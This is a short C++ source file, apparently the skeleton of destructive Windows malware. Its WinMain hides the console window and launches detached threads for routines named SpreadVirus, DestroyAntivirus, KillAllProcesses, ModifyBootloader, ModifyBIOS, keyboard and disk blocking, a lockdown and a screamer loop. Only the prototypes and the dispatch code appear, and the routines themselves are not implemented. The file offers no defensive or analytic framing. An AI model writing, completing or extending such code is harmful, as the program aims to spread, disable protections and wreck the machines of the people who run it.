#include <windows.h>
#include <iostream>
#include <thread>
#include <vector>
#include <random>
#include <chrono>
#include <filesystem>
#include <tlhelp32.h>
#include <shlobj.h>
#include <shellapi.h>
#include <fstream>
#include <string>

namespace fs = std::filesystem;

// Прототипы
void InitializeScareModule();
void InitializeFileSystemModule();
void InitializeKeyboardBlockModule();
void SpreadVirus();
void KillAllProcesses();
void DestroyAntivirus();
void ModifyBootloader();
void ModifyBIOS();
void OpenRandomAppsAndSites();
void ScreamerLoop();
void InitializeDiskBlockModule();
void InitializeLockdownModule();

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    std::vector<std::thread> threads;
    
    threads.emplace_back(InitializeLockdownModule);
    threads.emplace_back(InitializeScareModule);
    threads.emplace_back(InitializeFileSystemModule);
    threads.emplace_back(InitializeKeyboardBlockModule);
    threads.emplace_back(KillAllProcesses);
    threads.emplace_back(DestroyAntivirus);
    threads.emplace_back(ModifyBootloader);
    threads.emplace_back(ModifyBIOS);
    threads.emplace_back(OpenRandomAppsAndSites);
    threads.emplace_back(SpreadVirus);
    threads.emplace_back(InitializeDiskBlockModule);
    threads.emplace_back(ScreamerLoop);

    for (auto& t : threads) {
        if (t.joinable()) t.detach();
    }

    while (true) {
        Sleep(10000);
    }

    return 0;
}
